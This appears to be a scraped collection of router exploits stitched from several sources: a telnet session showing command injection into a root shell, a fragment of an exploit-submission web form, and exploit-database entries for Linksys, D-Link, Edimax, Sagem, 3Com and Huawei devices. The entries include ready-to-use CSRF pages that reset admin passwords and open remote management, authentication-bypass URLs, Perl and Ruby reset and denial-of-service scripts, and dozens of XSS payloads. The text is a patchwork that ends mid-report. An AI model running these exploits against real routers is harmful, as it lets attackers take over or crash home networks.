adsl
atm
ddns
dumpcfg
ping
siproxd
sntp
sysinfo
tftp
wlan
version
build
ipfilter
> sysinfo
Number of processes: 30
11:46pm  up 2 days, 23:46,
load average: 1 min:0.12, 5 min:0.05, 15 min:0.09
total         used         free       shared      buffers
Mem:        14012        13028          984            0          588
Swap:            0            0            0
Total:        14012        13028          984
> sysinfo ;sh                               ## JAILBREAK !! FirmWare sucks  :)
Number of processes: 30
11:47pm  up 2 days, 23:47,
load average: 1 min:0.07, 5 min:0.05, 15 min:0.08
total         used         free       shared      buffers
Mem:        14012        13024          988            0          588
Swap:            0            0            0
Total:        14012        13024          988
BusyBox v1.00 (2009.12.08-09:42+0000) Built-in shell (msh)
Enter 'help' for a list of built-in commands.
Linux version 2.6.8.1 (wander@localhost.localdomain) (gcc version 3.4.2) #1 Tue Dec 8 17:40:39 CST 2009
PID  Uid     VmSize Stat Command
1 root        280 S   init
2 root            SWN [ksoftirqd/0]
3 root            SW< [events/0]
4 root            SW< [khelper]
5 root            SW< [kblockd/0]
15 root            SW  [pdflush]
16 root            SW  [pdflush]
17 root            SW  [kswapd0]
18 root            SW< [aio/0]
23 root            SW  [mtdblockd]
32 root        328 S   -sh
65 root       1384 S   cfm
72 root            SW  [bcmsw]
192 root        216 S   pvc2684d
275 root        496 S   nas -P /var/wl0nas.lan0.pid -H 34954 -l br0 -i wl0 -A
342 root        304 S   dhcpd
596 root       1384 S   CT_Polling
600 root        432 S   pppd -c 0.0.35.1 -i nas_0_0_35 -u <CENSORED> -p
931 root        248 S   dhcpc -i nas_0_0_40
993 root        316 S   dproxy -D btc-adsl
997 root        352 S   upnp -L br0 -W ppp_0_0_35_1 -D
1013 root        512 S   siproxd --config /var/siproxd/siproxd.conf
1014 root        512 S   siproxd --config /var/siproxd/siproxd.conf
1015 root        512 S   siproxd --config /var/siproxd/siproxd.conf
10745 root        292 S   syslogd -C -l 7
10747 root        256 S   klogd
6616 root       1396 S   telnetd
6618 root       1428 S   telnetd
6673 root        284 S   sh -c sysinfo ;sh
6724 root        284 R   ps
Mem: 13164K used, 848K free, 0K shrd, 588K buff, 5920K cached
Load average: 0.00, 0.02, 0.07    (State: S=sleeping R=running, W=waiting)
PID USER     STATUS   RSS  PPID %CPU %MEM COMMAND
6751 root     R        288  6675  0.7  2.0 exe
2 root     SWN        0     1  0.3  0.0 ksoftirqd/0
6616 root     S       1396    65  0.1  9.9 telnetd
931 root     S        248     1  0.1  1.7 dhcpc
6618 root     S       1428  6616  0.0 10.1 telnetd
65 root     S       1384    32  0.0  9.8 cfm
596 root     S       1384    65  0.0  9.8 CT_Polling
1013 root     S        512     1  0.0  3.6 siproxd
1014 root     S        512  1013  0.0  3.6 siproxd
1015 root     S        512  1014  0.0  3.6 siproxd
275 root     S        496     1  0.0  3.5 nas
600 root     S        432     1  0.0  3.0 pppd
997 root     S        352     1  0.0  2.5 upnp
32 root     S        328     1  0.0  2.3 sh
993 root     S        316     1  0.0  2.2 dproxy
6675 root     S        316  6673  0.0  2.2 exe
342 root     S        304     1  0.0  2.1 dhcpd
10745 root     S        292     1  0.0  2.0 exe
6673 root     S        284  6618  0.0  2.0 sh
1 root     S        280     0  0.0  1.9 init
bin dev etc lib linuxrc mnt proc sbin usr var webs
</li>
<li id=""text-cont_2"">
<label for=""extension"">Text file extension:</label>
<input type=""text"" name=""extension"" id=""extension"" value=""txt"" class=""small"" />
</li>
<li id=""attch_cont"" style=""display:none;"">
<label for=""attached_file"">Attached file name:</label>
<input type=""text"" name=""file_path"" id=""attached_file"" value="""" class=""large"" />
</li>
<li>
<label for=""application_link"">Application link:</label>
<input type=""text"" name=""application_link"" id=""application_link"" value="""" class=""large"" />
</li>
<li>
<label for=""application_version"">Application version:</label>
<input type=""text"" name=""application_version"" id=""application_version"" value="""" class=""large"" />
</li>
<li>
<label for=""application_file_name"">Application file name:</label>
<input type=""text"" name=""application_path"" id=""application_file_name"" value="""" class=""large"" />
</li>
<li>
<label for=""application_md5"">Application file md5:</label>
<input type=""text"" name=""application_md5"" id=""application_md5"" value="""" class=""large"" />
</li>
<li>
<label for=""cve"">CVE code:</label>
<input type=""text"" name=""cve"" id=""cve"" value="""" class=""small"" />
</li>
<li>
<label for=""osvdb"">OSVDB code:</label>
<input type=""text"" name=""osvdb"" id=""osvdb"" value="""" class=""small"" />
</li>
<li>
<label for=""import_as_gd"">Add as google dork:</label>
<input type=""checkbox"" name=""import_as_gd"" id=""import_as_gd"" value=""1"" onclick=""toggleImportGDform();""/>
<ul class=""google-dork-import-form"" style=""display:none;"">
<li>
<label for=""ghdb_status"">Status:</label>
<select name=""ghdb_status"" id=""ghdb_status"">
<option value=""1"" selected=""selected"">Active</option>
<option value=""0"">Pending</option>
</select>
</li>
<li>
<label for=""ghdb_cat_id"">Category:</label>
<select name=""ghdb_cat_id"" id=""ghdb_cat_id"">
<option value=""0"" selected=""selected"";>Select category</option>
<option value=""1"">Footholds</option>
<option value=""2"">Files containing usernames</option>
<option value=""3"">Sensitive Directories</option>
<option value=""4"">Web Server Detection</option>
<option value=""5"">Vulnerable Files</option>
<option value=""6"">Vulnerable Servers</option>
<option value=""7"">Error Messages</option>
<option value=""8"">Files containing juicy info</option>
<option value=""9"">Files containing passwords</option>
<option value=""10"">Sensitive Online Shopping Info</option>
<option value=""11"">Network or vulnerability data</option>
<option value=""12"">Pages containing login portals</option>
<option value=""13"">Various Online Devices</option>
<option value=""14"">Advisories and Vulnerabilities</option>
</select>
</li>
<li>
<label for=""ghdb_title"">Title:</label>
<input type=""text"" name=""ghdb_title"" id=""ghdb_title"" value="""" class=""text"" />
</li>
<li>
<label for=""ghdb_text"">Text:</label>
<textarea name=""ghdb_text"" value=""ghdb_text"">"
2010-12-04,WebApps,Hardware,Martin Barbella,Linksys Routers,Cross-Site Request Forgery,,"It seems to be fairly well known that there are multiple unpatched
CSRF vulnerabilities in the administration interfaces for various
Linksys routers. Since the initial reports of these are from a few
years ago, and since some exploits are available, I have written
additional proof of concept exploits for the Linksys routers that I
have access to.
While in most cases the victim must be authenticated with the
application in question to exploit a CSRF vulnerability, since the
factory default passwords for all of the routers in question are known
to be admin, the victim does not necessarily need to be authenticated.
This means that only suggested workaround that I have seen up until
now, do not surf the web wile authenticated in the router's
administration interface, does not solve the problem in certain cases
where the user is still using the default password. This is mitigated
somewhat by the fact that most browsers provide at least some degree
of protection from these types of attacks, described in additional
detail below.
In each case, the proof of concept will enable remote administration
of the router on port 31337, while changing the password to __pwn3d__.
WRT54G2 PoC (tested with hardware version 1.5 and firmware version 1.50):
<html>
<head>
<title>WRT54G2 CSRF PoC</title>
</head>
<body onload=""document.getElementById('F').submit()"">
<form action=""http://192.168.1.1/Manage.tri""; method=""post"" id=""F"">
<input type=""hidden"" name=""MANAGE_USE_HTTP"" value=""0"" />
<input type=""hidden"" name=""MANAGE_HTTP"" value=""1"" />
<input type=""hidden"" name=""MANAGE_HTTP_S"" value=""0"" />
<input type=""hidden"" name=""MANAGE_PASSWORDMOD"" value=""1"" />
<input type=""hidden"" name=""MANAGE_PASSWORD"" value=""__pwn3d__"" />
<input type=""hidden"" name=""MANAGE_PASSWORD_CONFIRM"" value=""__pwn3d__"" />
<input type=""hidden"" name=""_http_enable"" value=""1"" />
<input type=""hidden"" name=""MANAGE_WLFILTER"" value=""1"" />
<input type=""hidden"" name=""MANAGE_REMOTE"" value=""1"" />
<input type=""hidden"" name=""MANAGE_PORT"" value=""31337"" />
<input type=""hidden"" name=""MANAGE_UPNP"" value=""1"" />
<input type=""hidden"" name=""layout"" value=""en"" />
</form>
</body>
</html>
The form's action can be changed in the following way to attempt to
log in with the default password:
<form action=""http://a:admin () 192 168 1 1/Manage.tri"" method=""post"" id=""F"">
As I mentioned before, success of this type of exploit depends on the
victim's browser. This is simply blocked in IE8, while Safari will
give a phishing warning, Firefox warns the user that they are
attempting to log in with the name ""a"", and Google Chrome simply
allows the request without notifying the user in any way.
WRT54G PoC (tested with hardware version 6 and firmware version 1.02.8):
<html>
<head>
<title>WRT54G CSRF PoC</title>
</head>
<body onload=""document.getElementById('F').submit()"">
<form action=""http://192.168.1.1/manage.tri""; method=""post"" id=""F"">
<input type=""hidden"" name=""remote_mgt_https"" value=""0"" />
<input type=""hidden"" name=""http_enable"" value=""1"" />
<input type=""hidden"" name=""https_enable"" value=""0"" />
<input type=""hidden"" name=""PasswdModify"" value=""1"" />
<input type=""hidden"" name=""http_passwd"" value=""__pwn3d__"" />
<input type=""hidden"" name=""http_passwdConfirm"" value=""__pwn3d__"" />
<input type=""hidden"" name=""_http_enable"" value=""1"" />
<input type=""hidden"" name=""web_wl_filter"" value=""1"" />
<input type=""hidden"" name=""remote_management"" value=""1"" />
<input type=""hidden"" name=""http_wanport"" value=""31337"" />
<input type=""hidden"" name=""upnp_enable"" value=""1"" />
<input type=""hidden"" name=""layout"" value=""en"" />
</form>
</body>
</html>
To attempt a login with the default password, the same type of
modification can be made, as shown here:
<form action=""http://a:admin () 192 168 1 1/manage.tri"" method=""post"" id=""F"">
BEFSR41 PoC (tested with hardware version 3 and firmware version 1.06.01):
<img
src=""http://192.168.1.1/Gozila.cgi?PasswdModify=1&sysPasswd=__pwn3d__&sysPasswdConfirm=__pwn3d__&Remote_Upgrade=1&Remote_Management=1&RemotePort=31337&UPnP_Work=0"";
alt=""Nothing to see here."" />
And once again, a modification can be made to attempt to log in with
the default password, as shown here:
<img src=""http://a:admin () 192 168 1
1/Gozila.cgi?PasswdModify=1&sysPasswd=__pwn3d__&sysPasswdConfirm=__pwn3d__&Remote_Upgrade=1&Remote_Management=1&RemotePort=31337&UPnP_Work=0""
alt=""Nothing to see here."" />
It is worth mentioning that even if a user has changed the router's
password, but is using a weak password, they may still be vulnerable
to this type of attack. An attacker could simply try many weak
passwords in a dictionary-style attack. They could also use javascript
to attempt to brute force the password, provided that they were able
to get the victim to stay on a page for a reasonably long time.
-Martin Barbella"
2010-12-03,WebApps,Hardware,Craig Heffner,D-Link Routers,Authentication Bypass (1),"# Exploit Title: Multiple D-Link Router Authentication Bypass Vulnerabilities
# Date: 12-01-2011
# Author: Craig Heffner, /dev/ttyS0
# Firmware Link: http://www.dlink.co.uk/
# Firmware Version(s): All
# Tested on: DIR-300, DIR-320, DIR-615 revD
http://192.168.0.1/bsc_lan.php?NO_NEED_AUTH=1&AUTH_GROUP=0","Multiple D-Link routers that use a PHP based Web interface suffer from the same authentication bypass
vulnerability which allows unprivileged users to view and modify administrative router settings.
Further, even if remote administration is disabled this vulnerability can be exploited by a remote
attacker via a CSRF attack.
The vulnerability has been confirmed in the following routers:
DIR-615 revD
DIR-320
DIR-300
The following example URL will allow access to the router's main administrative Web page without authentication:
For a more detailed description of the vulnerability, see: http://www.devttys0.com/wp-content/uploads/2010/12/dlink_php_vulnerability.pdf.
Note that this vulnerability was independently discovered in the DIR-300 and subsequently reported by Karol Celin on 09-Nov-2010 [1].
[1] http://www.securityfocus.com/archive/1/514687/30/120/threaded"
2010-04-03,WebApps,Hardware,l3D,Edimax AR-7084GA Router,Cross-Site Request Forgery / Persistent Cross-Site Scripting,,"<?php
Edimax AR-7084GA Router CSRF + Persistent XSS Exploit
Firmware version: 2.9.8.1(RUE0.C2A)3.7.6.1
Vulnerable page: http://[xx.xx.xx.xx]/advanced/adv_nat_virsvr.htm
Author: l3D
Sites: http://xraysecurity.blogspot.com, http://nullbyte.org.il
IRC: irc://irc.nix.co.il
Email: pupipup33@gmail.com
Like every CSRF attack, the victim must be logged in first before he
opens this malicious page.
Then he should wait some seconds until the router receives all the requests.
It may take few tries until it works.
The code should be split into parts because the router limits the
VIRTUALSVR_Application parameter length.
The author doesn't take any responsibility for what you do with that code.
if(!isset($_GET[""ip""]) or !is_string($_GET[""ip""])) die(""The victim
router's ip isn't set!"");
else $ip=$_GET[""ip""];
if(!isset($_GET[""time""])){
$script=Array(
foreach($script as $part)
if(strlen($part)>25) die(""One or more of the parts can't be longer
then 25 characters!"");
$url=""http://"".$_SERVER[""SERVER_NAME""].$_SERVER[""REQUEST_URI""];
for($i=1; $i<=count($script); $i++){
$target=$url.""&time="".$i.""&script="".urlencode($script[$i-1]);
echo '<iframe src=""'.$target.'"" height=""0"" width=""0""></iframe>';
die();
else{
$time=$_GET[""time""];
$script=$_GET[""script""];
<html>
<head>
</head>
<body>
<form method=""post"" action=""http://<?php echo $ip;
?>/Forms/adv_nat_virsvr_1"" name=""VIRTUALSVR_form"">
<input type=""hidden"" name=""VIRTUALSVR_IndexFlag"" value=""0"" />
<input type=""hidden"" name=""VIRTUALSVR_index"" value=""<?php echo $time; ?>"" />
<input type=""hidden"" name=""VIRTUALSVR_Application"" value=""<?php
echo htmlspecialchars($script); ?>"" />
<input type=""hidden"" name=""VIRTUALSVR_startPort"" value=""<?php echo
$time; ?>"" />
<input type=""hidden"" name=""VIRTUALSVR_endPort"" value=""<?php echo
$time; ?>"" />
<input type=""hidden"" name=""VIRTUALSVR_localIP"" value=""<?php echo $ip; ?>"" />
</body>
</html>"
2010-03-04,WebApps,Hardware,AlpHaNiX,Sagem Routers,Remote Authentication Bypass,"#!/usr/bin/perl
# Exploit Title: Sagem routers Remote auth bypass Exploit
# Date: 04/03/2010
# Author: AlpHaNiX
# Software Link: null
# Version: Sagem Routers F@ST (1200/1240/1400/1400W/1500/1500-WG/2404
# Tested on: Sagem F@ST 2404
# Code :","use HTTP::Request;
use HTTP::Headers;
use LWP::UserAgent;
system('cls');
sub help()
print ""\n[X] the target must be sagem rooter main ip adress\n"".
""[X] affected Versions : Sagem Routers F@ST (1200/1240/1400/1400W/1500/1500-WG/2404)\n"".
""[X] Usage   : perl $0 --function ip \n"".
""[X] Example : ./exploit.pl<http://exploit.pl> --reset 192.168.1.1 \n"".
""[X] Example : ./exploit.pl<http://exploit.pl> --reboot 192.168.1.1 \n"";
sub header()
print ""\n[+]====================================[+]\n"".
""[+] Sagem routers Remote Auth bypass   [+]\n"".
""[+] Found And Exploit By AlpHaNiX      [+]\n"".
""[+] Contact  : AlpHa[at]Hacker[dot]Bz  [+]\n"".
""[+] HomePage : NullArea.Net            [+]\n"".
""[+]====================================[+]\n\n\n""
sub resetz()
my $target = $ipz.""restoreinfo.cgi"" ;
my $request = HTTP::Request->new(GET=>$target);
my $useragent = LWP::UserAgent->new();
my $response = $useragent->request($request);
if($response->content =~ m/<HTML><HEAD><TITLE>401 Unauthorized<\/TITLE><\/HEAD>/i && $response->content =~ m/<BODY BGCOLOR=""#cc9999""><H4>401 Unauthorized<\/H4>/ && $response->content =~ m/<ADDRESS><A HREF=""http:\/\/www.acme.com<http://www.acme.com>\/software\/micro_httpd\/"">micro_httpd<\/A><\/ADDRESS>/ )
print ""[+] Authentication bypassed !\n"" ;
print ""[+] Exploited , $ip is restored"" ;
else
print ""[+] Please make sure you entered real sagem router ip\n"" ;
sub reboot()
my $target = $ipz.""rebootinfo.cgi"" ;
my $request = HTTP::Request->new(GET=>$target);
my $useragent = LWP::UserAgent->new();
my $response = $useragent->request($request);
if($response->content =~ m/<HTML><HEAD><TITLE>401 Unauthorized<\/TITLE><\/HEAD>/i && $response->content =~ m/<BODY BGCOLOR=""#cc9999""><H4>401 Unauthorized<\/H4>/ && $response->content =~ m/<ADDRESS><A HREF=""http:\/\/www.acme.com<http://www.acme.com>\/software\/micro_httpd\/"">micro_httpd<\/A><\/ADDRESS>/ )
print ""[+] Authentication bypassed !\n"" ;
print ""[+] Exploited , $ip is rebooted"" ;
else
print ""[+] Please make sure you entered real sagem router ip\n"" ;
if (@ARGV != 2) { header();help(); exit(); }
else{
my $i=0;
foreach (@ARGV)
if ($ARGV[$i] eq ""--reboot""){$ip = $ARGV[$i+1];$function = 'reboot';}
if ($ARGV[$i] eq ""--reset""){$ip = $ARGV[$i];$function = 'reset';}
$i++;
if ($ip =~ /http:\/\// ) { $ipz = $ip.""/""; } else { $ipz = ""http://"".$ip.""/""}
header();
print ""[+] Working on $ip ..\n\n"";
if($function eq 'reboot'){reboot()}
if($function eq 'reset'){resetz()}"
2010-03-04,DoS,Hardware,AlpHaNiX,Sagem Routers,Remote Reset,"#!/usr/bin/perl
# Exploit Title: Sagem routers Remote Reset Exploit
# Date: 04/03/2010
# Author: AlpHaNiX
# Software Link: null
# Version: Sagem Routers F@ST (1200/1240/1400/1400W/1500/1500-WG/2404
# Tested on: Sagem F@ST 2404
# Code :","use HTTP::Request;
use HTTP::Headers;
use LWP::UserAgent;
system('cls');
if (@ARGV != 1) { header();help(); exit(); }
else{
if ($ARGV[0] =~ /http:\/\// ) { $ipz = $ARGV[0].""/""; } else { $ipz = ""http://"".$ARGV[0].""/"";$ip=$ARGV[0] }
header();
print ""[+] Working on $ip ..\n\n"";
exploit();
sub help()
print ""\n[X] the target must be sagem rooter main ip adress\n"".
""[X] affected Versions : Sagem Routers F@ST (1200/1240/1400/1400W/1500/1500-WG/2404)\n"".
""[X] Usage   : perl $0 target \n"".
""[X] Example : ./exploit.pl<http://exploit.pl> 192.168.1.1 \n"";
sub header()
print ""\n[+]====================================[+]\n"".
""[+] Sagem routers Remote Reset Exploit [+]\n"".
""[+] Found And Exploit By AlpHaNiX      [+]\n"".
""[+] Contact  : AlpHa[at]Hacker[dot]Bz  [+]\n"".
""[+] HomePage : NullArea.Net            [+]\n"".
""[+]====================================[+]\n\n\n""
sub exploit()
my $target = $ipz.""restoreinfo.cgi"" ;
my $request = HTTP::Request->new(GET=>$target);
my $useragent = LWP::UserAgent->new();
my $response = $useragent->request($request);
if($response->content =~ m/<HTML><HEAD><TITLE>401 Unauthorized<\/TITLE><\/HEAD>/i && $response->content =~ m/<BODY BGCOLOR=""#cc9999""><H4>401 Unauthorized<\/H4>/ && $response->content =~ m/<ADDRESS><A HREF=""http:\/\/www.acme.com<http://www.acme.com>\/software\/micro_httpd\/"">micro_httpd<\/A><\/ADDRESS>/ )
print ""[+] Authentication bypassed !\n"" ;
print ""[+] Exploited , $ip is restored"" ;
else
print ""[+] Please make sure you entered real sagem router ip\n"" ;"
2010-01-10,WebApps,Hardware,SourceSec DevTeam,D-Link Routers,Authentication Bypass (2),http://www.sourcesec.com/Lab/dlink_hnap_captcha.pdf,"Multiple D-­Link routers suffer from insecure implementations of the Home Network Administration
Protocol which allow un­authenticated and/or un­privileged users to view and configure administrative
settings on the router.
Further, the mere existence of HNAP allows attackers to completely bypass the CAPTCHA login
features that D-­Link has made available in recent firmware releases.
It is suspected that most, if not all, D­-Link routers manufactured since 2006 have HNAP support and
are vulnerable to one of the below described vulnerabilities. However, only the following routers and
firmware versions have been confirmed to date:
1) DI­524 hardware version C1, firmware version 3.23
2) DIR­628 hardware version B2, firmware versions 1.20NA and 1.22NA
3) DIR­655 hardware version A1, firmware version 1.30EA
Detailed description available here:
POC code available here: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/11101.tar.gz (hnap0wn.tar.gz)"
2009-12-21,DoS,Hardware,Alberto Ortega,3Com OfficeConnect Routers,'Content-Type' Denial of Service,"# Model -> Tested on 3Com OfficeConnect ADSL Wireless 11g Firewall Router 3CRWDR100A-72 and 3CRWDR100Y-72
# Software Version -> Tested on 2.06T13 (Apr 2007, last version for these routers)
# Attacker -> Tested from GNU/Linux (Sidux and Ubuntu) and Windows 7
# Exploit languaje -> Ruby
# Type -> Remote Denial of Service Exploit by HTTP
# Additional info:
# - The bug can be exploited with Tamper Data (Firefox Addon) too, LOL.
# Discovered and written by Alberto Ortega
# http://pentbox.net/
# 8.times is enough to DoS
# Here are the HTTP packet, Content-Type value causes the DoS","require ""socket""
host = ARGV[0]
buffer = ""A""
send = """"
puts """"
if !host
puts "" 3Com OfficeConnect ADSL Wireless 11g Firewall Router""
puts "" Remote DoS Exploit by HTTP""
puts "" ------ Usage ---------------------------------------""
puts "" ruby 3com_dosexploit.rb host""
puts "" Ex: ruby 3com_dosexploit.rb 192.168.1.1""
else
begin
socket = TCPSocket.new(host, 80)
puts ""- Exploiting ...""
9.times do
buffer = ""#{buffer}#{buffer}""
end
send = ""GET / HTTP/1.1\r\nContent-Type:#{buffer}\r\n""
socket.write(send)
puts ""- Successfully! :)""
rescue
puts ""Connection problem""
end
end
puts """""
2009-12-19,DoS,Hardware,Alberto Ortega Llamas,3Com OfficeConnect Routers,Remote Denial of Service,"# Model -> Tested on 3Com OfficeConnect ADSL Wireless 11g Firewall Router 3CRWDR100A-72 and 3CRWDR100Y-72
# Software Version -> Tested on 2.06T13 (Apr 2007, last version for these routers)
# Attacker -> Tested from GNU/Linux (Sidux and Ubuntu)
# Exploit languaje -> Ruby
# Type -> Remote Denial of Service Exploit by HTTP
# Additional info:
# - I tested it in other similar 3Com router and the system do not crash, but the Internet connection yes.
# - The bug can be exploited with Tamper Data (Firefox Addon) too, LOL.
# Discovered and written by Alberto Ortega
# http://pentbox.net/
# 8.times is enough to DoS
# Here are the HTTP packet, Authorization value causes the DoS","require ""socket""
host = ARGV[0]
buffer = ""A""
send = """"
puts """"
if !host
puts "" 3Com OfficeConnect ADSL Wireless 11g Firewall Router""
puts "" Remote DoS Exploit by HTTP""
puts "" ------ Usage ---------------------------------------""
puts "" ruby 3com_dosexploit.rb host""
puts "" Ex: ruby 3com_dosexploit.rb 192.168.1.1""
else
begin
socket = TCPSocket.new(host, 80)
puts ""- Exploiting ...""
9.times do
buffer = ""#{buffer}#{buffer}""
end
send = ""GET / HTTP/1.1\r\nAuthorization:#{buffer}\r\n""
socket.write(send)
puts ""- Successfully! :)""
rescue
puts ""Connection problem""
end
end
puts """""
2009-12-03,WebApps,Hardware,DecodeX01,Huawei MT882 Modem/Router,Multiple Vulnerabilities,"# Version: V100R002B020 ARG-T
# Firmware Release: 3.7.9.98
#Greets to my bests friends: DeepLook, [R00T], systemfailure, Ciber34, ANDSQLiTor, La_Peke #
#Greets to friend: Scuarplex, Crl, KiKoArg, ZeRO, DNSX, PunkiD
# DecodeX01[at]gmail[dot]com","Target device ip 10.0.0.2:80 (default ip:port)
Server information
Responsive =============>True
Server banner ==========>RomPager/4.07 UPnP/1.0
Server OS ==============>Unknown
Server =================> technologies
Threat level
Threat Level 3
More than one high-severity type vulnerabilities have been discovered. A malicious user can exploit these vulnerabilities
and compromise sensitive data from user's login (inet access data), or any action he want thru xss.
Alerts distribution
Total alerts found256
High252
Medium0
Low1
Informational3
List of client scripts
These files contain Javascript code referenced from the website./General.js
List of files with inputs
These files have at least one input (GET or POST).
/Forms/fresh_pppoe_1 - 1 inputs
/Forms/rpStatus_argen_1 - 3 inputs
/Forms/rpwizard_1 - 3 inputs
/Forms/rpDiag_argen_1 - 3 inputs
/Forms/rpNATvirsvr_argen_1 - 12 inputs
/Forms/rpwizPppoe_1 - 5 inputs
/Forms/rpNATdmz_argen_1 - 3 inputs
/Forms/error_1 - 1 inputs
Alerts summary
Cross Site Scripting
AffectsVariations
/Forms/error_110
/Forms/fresh_pppoe_19
/Forms/rpDiag_argen_119
/Forms/rpNATdmz_argen_119
/Forms/rpNATvirsvr_argen_1110
/Forms/rpStatus_argen_128
/Forms/rpwizard_147
/Forms/rpwizPppoe_110
User credentials are sent in clear text
AffectsVariations
/rpwizPppoe.htm1
Password type input with autocomplete enabled
AffectsVariations
/rpwizPppoe.htm1
Alert details
Cross Site Scripting
Severity ==========> High
Type ==============> Validation
Description
This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code
(usually in the form of Javascript) to another user. Because a browser cannot know if the script should be trusted
or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens
retained by the browser.
Impact
Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a
user in order to gather data from them. An attacker can steal the session cookie and take over the account,
impersonating the user. It is also possible to modify the content of the page presented to the user.
Recommendation
The script script should filter metacharacters from user input.
Affected items
/Forms/error_1
Details
The POST variable BackButton has been set to %3Cimg%20src%3D%22JaVaS%26%2399%3BRiPt:alert%28416275520282%29%3B%22%3E .
BackButton=%3Cimg%20src%3D%22JaVaS%26%2399%3BRiPt:alert%28416275520282%29%3B%22%3E
/Forms/error_1
Details
The POST variable BackButton has been set to >""><ScRiPt%20%0a%0d>alert(416215520282)%3B</ScRiPt> .
/Forms/error_1
Details
The POST variable BackButton has been set to &lt;/textarea&gt;<ScRiPt%20%0a%0d>alert(416225520282)%3B</ScRiPt> .
BackButton=&lt;/textarea&gt;<ScRiPt%20%0a%0d>alert(416225520282)%3B</ScRiPt>
/Forms/error_1
Details
The POST variable BackButton has been set to <script>alert(416185520282)</script> .
/Forms/error_1
Details
The POST variable BackButton has been set to <ScRiPt%20%0a%0d>alert(416195520282)%3B</ScRiPt> .
BackButton=<ScRiPt%20%0a%0d>alert(416195520282)%3B</ScRiPt>
/Forms/error_1
Details
The POST variable BackButton has been set to >'><ScRiPt%20%0a%0d>alert(416205520282)%3B</ScRiPt> .
BackButton=>'><ScRiPt%20%0a%0d>alert(416205520282)%3B</ScRiPt>
/Forms/error_1
Details
The POST variable BackButton has been set to --><ScRiPt%20%0a%0d>alert(416245520282)%3B</ScRiPt> .
BackButton=--><ScRiPt%20%0a%0d>alert(416245520282)%3B</ScRiPt>
/Forms/error_1
Details
The POST variable BackButton has been set to </title><ScRiPt%20%0a%0d>alert(416235520282)%3B</ScRiPt> .
BackButton=</title><ScRiPt%20%0a%0d>alert(416235520282)%3B</ScRiPt>
/Forms/error_1
Details
The POST variable BackButton has been set to %3Cimg%20dynsrc%3D%22JaVaScRiPt:alert%28416335520329%29%3B%22%3E .
BackButton=%3Cimg%20src%3D%22JaVaS%26%2399%3BRiPt:alert%28416275520282%29%3B%22%3E
/Forms/error_1
Details
The POST variable BackButton has been set to email@some<ScRiPt%20%0a%0d>alert(416255520282)%3B</ScRiPt>domain.com .
BackButton=email@some<ScRiPt%20%0a%0d>alert(416255520282)%3B</ScRiPt>domain.com
/Forms/fresh_pppoe_1
Details
The POST variable wzConnFlag has been set to <ScRiPt%20%0a%0d>alert(401485272624)%3B</ScRiPt> .
/Forms/fresh_pppoe_1
Details
The POST variable wzConnFlag has been set to >'><ScRiPt%20%0a%0d>alert(401495272624)%3B</ScRiPt> .
wzConnFlag=>'><ScRiPt%20%0a%0d>alert(401495272624)%3B</ScRiPt>
/Forms/fresh_pppoe_1
Details
The POST variable wzConnFlag has been set to %3Cimg%20src%3D%22JaVaS%26%2399%3BRiPt:alert%28401565272624%29%3B%22%3E .
wzConnFlag=%3Cimg%20src%3D%22JaVaS%26%2399%3BRiPt:alert%28401565272624%29%3B%22%3E
/Forms/fresh_pppoe_1
Details
The POST variable wzConnFlag has been set to &lt;/textarea&gt;<ScRiPt%20%0a%0d>alert(401515272624)%3B</ScRiPt> .
wzConnFlag=&lt;/textarea&gt;<ScRiPt%20%0a%0d>alert(401515272624)%3B</ScRiPt>
/Forms/fresh_pppoe_1
Details
The POST variable wzConnFlag has been set to >""><ScRiPt%20%0a%0d>alert(401505272624)%3B</ScRiPt> .
wzConnFlag=>""><ScRiPt%20%0a%0d>alert(401505272624)%3B</ScRiPt>
/Forms/fresh_pppoe_1
Details
The POST variable wzConnFlag has been set to <script>alert(401475272624)</script> .
/Forms/fresh_pppoe_1
Details
The POST variable wzConnFlag has been set to email@some<ScRiPt%20%0a%0d>alert(401545272624)%3B</ScRiPt>domain.com .
wzConnFlag=email@some<ScRiPt%20%0a%0d>alert(401545272624)%3B</ScRiPt>domain.com
/Forms/fresh_pppoe_1
Details
The POST variable wzConnFlag has been set to --><ScRiPt%20%0a%0d>alert(401535272624)%3B</ScRiPt> .
/Forms/fresh_pppoe_1
Details
The POST variable wzConnFlag has been set to </title><ScRiPt%20%0a%0d>alert(401525272624)%3B</ScRiPt> .
wzConnFlag=</title><ScRiPt%20%0a%0d>alert(401525272624)%3B</ScRiPt>
/Forms/rpDiag_argen_1
Details
The POST variable diag_pppindex_argen has been set to --><ScRiPt%20%0a%0d>alert(407135360657)%3B</ScRiPt> .
diag_pppindex_argen=--><ScRiPt%20%0a%0d>alert(407135360657)%3B</ScRiPt>&DiagArgenTest=Test&DiagStartFlag=0
/Forms/rpDiag_argen_1
Details
The POST variable diag_pppindex_argen has been set to </title><ScRiPt%20%0a%0d>alert(407125360657)%3B</ScRiPt> .
diag_pppindex_argen=</title><ScRiPt%20%0a%0d>alert(407125360657)%3B</ScRiPt>&DiagArgenTest=Test&DiagStartFlag=0
/Forms/rpDiag_argen_1
Details
The POST variable diag_pppindex_argen has been set to %3Cimg%20src%3D%22JaVaS%26%2399%3BRiPt:alert%28407165360657%29%3B%22%3E .
diag_pppindex_argen=%3Cimg%20src%3D%22JaVaS%26%2399%3BRiPt:alert%28407165360657%29%3B%22%3E&DiagArgenTest=Test&DiagStartFlag=0
/Forms/rpDiag_argen_1
Details
The POST variable diag_pppindex_argen has been set to email@some<ScRiPt%20%0a%0d>alert(407145360657)%3B</ScRiPt>domain.com .
diag_pppindex_argen=email@some<ScRiPt%20%0a%0d>alert(407145360657)%3B</ScRiPt>domain.com&DiagArgenTest=Test&DiagStartFlag=0
/Forms/rpDiag_argen_1
Details
The POST variable diag_pppindex_argen has been set to &lt;/textarea&gt;<ScRiPt%20%0a%0d>alert(407115360657)%3B</ScRiPt> .
diag_pppindex_argen=&lt;/textarea&gt;<ScRiPt%20%0a%0d>alert(407115360657)%3B</ScRiPt>&DiagArgenTest=Test&DiagStartFlag=0
/Forms/rpDiag_argen_1
Details
The POST variable diag_pppindex_argen has been set to <ScRiPt%20%0a%0d>alert(407085360657)%3B</ScRiPt> .
diag_pppindex_argen=<ScRiPt%20%0a%0d>alert(407085360657)%3B</ScRiPt>&DiagArgenTest=Test&DiagStartFlag=0
/Forms/rpDiag_argen_1
